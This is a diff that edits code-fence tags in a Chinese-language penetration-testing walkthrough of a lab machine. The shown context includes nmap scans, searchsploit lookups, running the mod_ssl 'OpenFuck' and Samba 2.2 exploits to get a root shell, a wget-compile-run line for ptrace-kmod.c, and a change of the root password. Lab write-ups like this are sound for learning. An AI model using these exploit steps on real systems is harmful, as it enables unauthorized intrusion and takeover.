@@ -16,7 +16,7 @@
 
 首先 `ifconfig` 获取攻击机的 ip 为 `10.0.2.3`，使用 `nmap` 扫描 ip：
 
-```yacas
+```
 > nmap -sn 10.0.2.0/24
 Starting Nmap 7.95 at 2025-10-12 05:57 CST
 Nmap scan report for bogon (10.0.2.1)
@@ -37,7 +37,7 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 2.04 seconds
 
 以下是关键的节选内容，每个服务都会有相应的注释说明
 
-```yacas
+```
 // SSH 服务，支持 SSHv1
 // OpenSSH 2.9p2 的发布日期为 2000 年 12 月，非常古老
 // 可能存在漏洞
@@ -82,7 +82,7 @@ PORT      STATE SERVICE     VERSION
 
 注意到以下服务：
 
-```yacas
+```
 Apache/1.3.20
 mod_ssl/2.8.4
 OpenSSL/0.9.6b
@@ -90,7 +90,7 @@ OpenSSL/0.9.6b
 
 尝试用 `searchsploit` 进行漏洞寻找：
 
-```yacas
+```
 > searchsploit apache 1.3.20 
 ------------------------------------------- ---------------------------------
  Exploit Title                             |  Path
@@ -125,7 +125,7 @@ Shellcodes: No Results
 
 发现下面的关键内容：
 
-```yacas
+```
 Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/21671.c
 Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/47080.c
 Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/764.c
@@ -133,7 +133,7 @@ Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/764.c
 
 这和目前的服务（包括版本号限制）完全符合，使用 `searchsploit -m 47080` 获取对应的脚本
 
-```yacas
+```
 > searchsploit -m 47080
   Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
       URL: https://www.exploit-db.com/exploits/47080
@@ -150,7 +150,7 @@ Copied to: /home/kali/47080.c
 
 接下来尝试运行：
 
-```yacas
+```
 > ./getshell
 *******************************************************************
 * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
@@ -216,7 +216,7 @@ apache
 
 Getshell 成功，下一步是提权为 root，我们观察上一步的输出：
 
-```yacas
+```
 bash-2.05$ 
 d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
 --23:37:14--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
@@ -246,7 +246,7 @@ bash: ./exploit: No such file or directory
 
 虽然 Samba 服务在 nmap 扫描时并没有给出版本号，但是根据靶机上 Apache 与 OpenSSH 的版本对应的发布时间（2001~2002），考虑 Samba 服务也为同时期的版本。搜索发现此时的 Samba 的版本发布为 2.2.x 系列，并且在 2003 年之前发布的最晚版本为 2.2.8，据此尝试搜索漏洞：`searchsploit Samba 2.2`
 
-```yacas
+```
 > searchsploit Samba 2.2
 --------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                       |  Path
@@ -276,7 +276,7 @@ Shellcodes: No Results
 
 这里使用 `10.c` 进行 getshell，发现已经直接获取了 root 权限：
 
-```yacas
+```
 > gcc -std=gnu89 10.c -o samba			// 直接使用 gcc 10.c -o samba 会出现报错（更新的编译器会有更严格的语法检查）
 										// 这里使用 gnu89 旧标准
 > ./samba
@@ -324,7 +324,7 @@ root
 
 成功获取了 root 权限并且修改了 root 密码：
 
-```yacas
+```
 whoami
 root
 passwd root
